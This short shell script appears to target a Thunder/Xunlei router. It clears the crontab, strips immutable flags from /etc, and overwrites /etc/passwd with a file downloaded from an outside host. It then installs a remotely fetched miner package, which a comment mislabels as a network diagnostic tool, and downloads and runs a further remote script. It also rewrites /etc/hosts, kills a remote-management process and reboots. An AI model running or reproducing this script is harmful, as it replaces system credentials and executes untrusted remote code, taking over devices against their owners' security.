export LD_LIBRARY_PATH=/thunder/lib
LOG_PATH=/tmp/reset.log

crontab -r #清除crontab定时器内容

/bin/busybox chattr -i /etc 2>&1
chattr -i /etc/passwd*;

wget 'http://www.xiefucai.com/tools/zqb/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH



/thunder/bin/ubus call dcdn set_dcdn_client '{"count":1}'
rm -rf /root/update_cache* #消除定时清缓存脚本

if [ -d /opt/etc ];then
    if [ -h /opt ]; then
    	echo "not need remove /opt"
    else
        rm -rf /opt;
        mkdir -p /opt;
    fi
fi

# 安装断网诊断工具
wget 'http://update.peiluyou.com/conf/miner_beta2/packages/thunder-miner-app_V1.2.1150_arm.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH
opkg-cl remove thunder-miner-app
opkg-cl install /tmp/t.ipk

wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;sh /tmp/wget_ddd.sh 2>>$LOG_PATH;

(nslookup twin13033.sandai.net | tail -n 1 | head -n 1|awk -F':' '{print $2}'|awk '{print $1" kjapi.peiluyou.com"}'>>/etc/hosts && killall remote 2>&1 &)

sleep 30
sed -i '3,$d' /etc/hosts;
reboot
